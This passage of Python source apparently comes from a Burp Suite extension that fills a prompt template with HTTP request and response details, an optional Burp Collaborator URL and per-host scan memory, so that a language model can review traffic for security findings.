                "{URL}":                    url,
                "{METHOD}":                 method,
                "{REQUEST_HEADERS}":        req_headers_str,
                "{REQUEST_BODY}":           req_body_str,
                "{RESPONSE_STATUS_LINE}":   resp_status_line,
                "{RESPONSE_HEADERS}":       resp_headers_str,
                "{RESPONSE_BODY}":          resp_body_str,
                "{RESPONSE_BODY_TRUNCATED}":resp_body_str,
                "{REQUEST}":               full_request_str,
                "{RESPONSE}":              full_response_str,
                "{IS_TRUNCATED_PROMPT}":   str(is_truncated),
                "{COLLABORATOR_URL}":      collaborator_url or "N/A (Burp Collaborator not available)",
            }
            _pattern = re.compile("|".join(re.escape(k) for k in _subs))
            user_prompt = _pattern.sub(lambda m: _subs[m.group(0)], prompt_template)

            # Cross-scan memory context (our own trusted text) is prepended so the
            # model avoids re-reporting dismissed false positives on this host.
            if memory_context:
                user_prompt = (
                    "=== CROSS-SCAN MEMORY FOR THIS HOST ===\n" + memory_context +
                    "\n=== END MEMORY ===\n\n" + user_prompt)

            return SYSTEM_PROMPT, user_prompt

        except Exception as e:
            self._log("Error building prompts: {0}".format(str(e)))
            return SYSTEM_PROMPT, "Error building prompt: {0}".format(str(e))

    @staticmethod
    def get_default_template():
        return DEFAULT_USER_PROMPT_TEMPLATE

    @staticmethod
    def get_system_prompt():
        return SYSTEM_PROMPT
